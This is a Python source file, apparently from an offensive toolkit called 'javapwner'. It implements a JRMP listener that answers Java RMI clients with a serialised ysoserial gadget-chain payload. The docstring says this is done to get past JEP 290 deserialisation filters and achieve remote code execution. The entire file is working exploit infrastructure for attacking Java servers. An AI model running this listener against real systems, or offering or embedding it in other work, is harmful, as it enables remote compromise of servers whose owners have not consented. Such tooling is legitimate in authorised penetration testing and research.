"""JRMP listener — a minimal JRMP server that delivers a payload to
any connecting client.

When a JEP 290-filtered RMI endpoint deserialises a ``UnicastRef`` pointing
back to our listener, the target's RMI runtime connects here.  We respond
with a ``RETURN_VALUE`` message containing the actual ysoserial gadget
chain, which is deserialised *outside* the JEP 290 filter context.

This is the same technique used by ``ysoserial.exploit.JRMPListener``.
"""

from __future__ import annotations

import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Any

from javapwner.protocols.rmi.protocol import (
    JRMP_MAGIC,
    JRMP_VERSION,
    PROTOCOL_ACK,
    MSG_RETURN,
    RETURN_VALUE,
)
from javapwner.core.socket_helper import write_java_utf

_DEFAULT_TIMEOUT = 60.0


@dataclass
class JrmpListenerResult:
    """Result of a JRMP listener session."""
    connections: int = 0
    payloads_sent: int = 0
    errors: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "connections": self.connections,
            "payloads_sent": self.payloads_sent,
            "errors": self.errors,
        }


class JrmpListener:
    """A minimal JRMP server that serves an exploit payload.

    Parameters
    ----------
    payload:
        Raw serialised Java object to deliver to connecting clients.
    listen_host:
        Address to bind to (default ``"0.0.0.0"``).
    listen_port:
        Port to listen on (default ``8888``).
    timeout:
        Maximum seconds to wait for one connection (default 60).
    max_connections:
        Stop after this many connections (default 1).
    """

    def __init__(
        self,
        payload: bytes,
        listen_host: str = "0.0.0.0",
        listen_port: int = 8888,
        timeout: float = _DEFAULT_TIMEOUT,
        max_connections: int = 1,
    ):
        self.payload = payload
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.timeout = timeout
        self.max_connections = max_connections
        self._server: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._result = JrmpListenerResult()
        self._stop_event = threading.Event()

    @property
    def result(self) -> JrmpListenerResult:
        return self._result

    def start(self) -> None:
        """Start the listener in a background thread."""
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.settimeout(1.0)
        self._server.bind((self.listen_host, self.listen_port))
        self._server.listen(5)

        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Stop the listener."""
        self._stop_event.set()
        if self._server:
            try:
                self._server.close()
            except OSError:
                pass
        if self._thread:
            self._thread.join(timeout=5.0)

    def wait(self, timeout: float | None = None) -> JrmpListenerResult:
        """Block until the listener finishes or *timeout* expires."""
        if self._thread:
            self._thread.join(timeout=timeout or self.timeout)
        return self._result

    def _serve(self) -> None:
        """Accept connections and deliver the payload."""
        deadline = time.monotonic() + self.timeout
        while not self._stop_event.is_set():
            if self._result.connections >= self.max_connections:
                break
            if time.monotonic() > deadline:
                break
            try:
                client, addr = self._server.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            self._result.connections += 1
            try:
                self._handle_client(client)
                self._result.payloads_sent += 1
            except Exception as exc:
                self._result.errors.append(f"{addr}: {exc}")
            finally:
                try:
                    client.close()
                except OSError:
                    pass

    def _handle_client(self, sock: socket.socket) -> None:
        """Handle one JRMP client connection.

        Protocol:
        1. Read JRMP handshake from client (7 bytes)
        2. Send ProtocolAck + host/port
        3. Read client's endpoint info
        4. Send RETURN_VALUE with the exploit payload
        """
        sock.settimeout(10.0)

        # 1. Read JRMP handshake
        header = self._recv_exact(sock, 7)
        if header[:4] != JRMP_MAGIC:
            raise ValueError("Not a JRMP client")

        # 2. Send ProtocolAck — version must be 2 (JRMP StreamProtocol)
        ack = (
            bytes([PROTOCOL_ACK])
            + JRMP_VERSION              # b"\x00\x02"
            + write_java_utf(self.listen_host)
            + struct.pack(">I", self.listen_port)
        )
        sock.sendall(ack)

        # 3. Read client's endpoint info (variable length, just consume it)
        try:
            _client_host_data = sock.recv(512)
        except socket.timeout:
            pass

        # 4. Send RETURN_VALUE with the payload
        # MSG_RETURN + RETURN_VALUE(0x01) + transport-ack + payload
        return_msg = (
            bytes([MSG_RETURN, RETURN_VALUE])
            + self.payload
        )
        sock.sendall(return_msg)

    @staticmethod
    def _recv_exact(sock: socket.socket, n: int) -> bytes:
        """Receive exactly *n* bytes."""
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError("Connection closed")
            data += chunk
        return data
